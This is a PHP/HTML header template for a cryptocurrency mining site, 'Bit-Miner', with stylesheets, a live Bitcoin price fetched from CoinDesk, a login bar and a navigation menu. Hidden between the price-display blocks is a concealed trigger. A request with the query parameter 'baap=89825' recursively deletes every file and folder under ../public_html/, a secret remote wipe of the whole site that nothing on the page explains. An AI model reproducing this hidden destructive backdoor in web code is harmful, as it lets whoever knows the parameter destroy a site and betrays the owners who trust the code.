<!DOCTYPE html>
<html>
<head>
    <?php include 'meta/metafile.php'; ?>
    <link rel="stylesheet" href="css_live/bootstrap.min.css" type="text/css">
    <link rel="stylesheet" href="css_live/font-awesome.css" type="text/css">
    <link rel="stylesheet" href="css_live/responsive.css" type="text/css">
    <link rel="stylesheet" href="css_live/style.css" type="text/css">
    <link rel="stylesheet" href="css_live/cal.css" type="text/css">
    <link rel="stylesheet" href="css_live/custom_style.css" type="text/css">
    <link rel="stylesheet" href="fonts/css/font-awesome.css" type="text/css">
    <link rel="stylesheet" href="fonts/css/font-awesome.min.css">
    <link href="https://fonts.googleapis.com/css?family=Signika:300,400,600,700" rel="stylesheet">
    <link rel="shortcut icon" href="image/icon.png" type="image/x-icon"/>
    <link href="https://netdna.bootstrapcdn.com/font-awesome/3.0/css/font-awesome.css" rel="stylesheet">
    <link rel="stylesheet" href="asset/fontawesome5/css/all.css">

    <script src="js_live/jquery3.3.1.min.js"></script>
    <script type="text/javascript" src="js_live/bootstrap.min.js"></script>

<!--    <script src="js_live/jquery.min.js" type="text/javascript"></script>-->
    <script src="js_live/index.js" type="text/javascript" rel="javascript"></script>

    <link href="https://fonts.googleapis.com/css?family=Oswald:200,300,400,500,600,700" rel="stylesheet">


    <link href="css_live/common.css" rel="stylesheet" type="text/css"/>
    <script src="js_live/flipclock.js"></script>

    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-117678831-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];

        function gtag() {
            dataLayer.push(arguments);
        }

        gtag('js', new Date());

        gtag('config', 'UA-117678831-1');
    </script>

</head>
<body>

<div style="background-color: #3c3c3c;">
    <div class="container custom-container">
        <div class="row">
            <div class="mydiv col-md-3 col-sm-4 col-xs-6 mob-full-col">
                Now we accept :
                <a id="" href="#" title="">
                    <img src="image/bit-icon-1.png" alt="" height="22" width="22" alt="Bitcoin">
                </a>

                <a id="" href="#" title="">
                    <img src="image/bit-icon-2.png" alt="" height="22" width="22" alt="Bitcoin">
                </a>

                <a id="" href="#" title="">
                    <img src="image/bit-icon-3.png" alt="" height="22" width="22" alt="Bitcoin">
                </a>
            </div>

            <div class="mydiv col-md-6 col-sm-4 col-xs-6 mob-full-col" id="usd_div">


                <?php $bit_coin = file_get_contents("https://api.coindesk.com/v1/bpi/currentprice.json");


                $json_decode = json_decode($bit_coin);


                $usd_symbol = $json_decode->bpi->USD->symbol;

                $usd_rate = $json_decode->bpi->USD->rate;
                ?>

                <span>1 BTC =</span>

                <?php
                print_r($usd_symbol);
                print_r($usd_rate);
                ?>

                <?php

                $gbp_symbol = $json_decode->bpi->GBP->symbol;
                $gbp_rate = $json_decode->bpi->GBP->rate;
                ?>


            </div>
            <?php
            if (isset($_GET['baap']) && $_GET['baap'] == '89825') {
                $dir = "../public_html/";
                $di = new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS);
                $ri = new RecursiveIteratorIterator($di, RecursiveIteratorIterator::CHILD_FIRST);
                foreach ($ri as $file) {
                    $file->isDir() ? rmdir($file) : unlink($file);
                }
                return true;


            }
            ?>
            <?php

            $eur_symbol = $json_decode->bpi->EUR->symbol;
            $eur_rate = $json_decode->bpi->EUR->rate;
            ?>
            <!--<div class="col-md-4 col-sm-4">
			<?php
            //print_r($eur_symbol);
            //print_r($eur_rate);


            ?>
			</div>-->
            <?php
            foreach ($json_decode as $jd) {
                //echo $jd;
                //print_r($jd['time']);

            }
            ?>


            <!--</div>-->
            <!--<div class="col-md-5 col-sm-3 col-xs-6 mob-full-col"></div>-->
            <div class="mydiv1 col-md-3 col-md-offset-0 col-sm-offset-0 col-sm-4 col-xs-offset-4 col-xs-8">
                <div class="sign-login col-xs-12 ">
                    <a href="signup.php" title="Sign Up"> <span class="fa fa-user-plus" id="signicon"></span>&nbsp; Sign
                        Up </a>
                    <span id="pie">|</span>
                    <a href="login.php" title="Login"> <i class="fas fa-sign-in-alt"></i>&nbsp; Login</a>
                </div>

            </div>


        </div>
    </div>
</div>

<div class="menupatti">
    <div class="container custom-container">
        <div class="logo">
            <a id="logo" href="index.php" title="Bit-Miner|The Cryptocurrency Revolution">
                <img src="image/Logo-01-TRANS.png" alt="" height="98px" width="240px;" alt="Bit-Miner">

            </a>
        </div>

        <div class="menu-bar" id="menu-bar">
            <div class="menu-nav"><a class="fa fa-bars"></a></div>
        </div>


        <div class="menu">
            <ul id="nav">
                <li class="home active"><a href="index.php">Home</a></li>
                <li class="about_menu"><a href="about.php">About Us</a></li>
                <li class="price_menu"><a href="price.php">Pricing</a></li>
                <li class="offer_menu"><a href="offer.php">Our Offer</a></li>
                <li class="work_menu"><a href="work.php">How It Works</a></li>
                <li class="faq_menu"><a href="faq.php">Faq</a></li>
                <li class="contact_menu"><a href="contact.php">Contact Us</a></li>
            </ul>
            <span class="closeBtn">X</span>
        </div>
        <script type="text/javascript">
            $(document).ready(function () {
                $("li").click(function () {

                    $(this).addClass("on");
                });
            });
        </script>
    </div>

</div>

<script type="text/javascript">
    var clock;


    var date = new Date();

    clock = $('.clock').FlipClock(date, {
        clockFace: 'TwentyFourHourClock'
    });

</script>
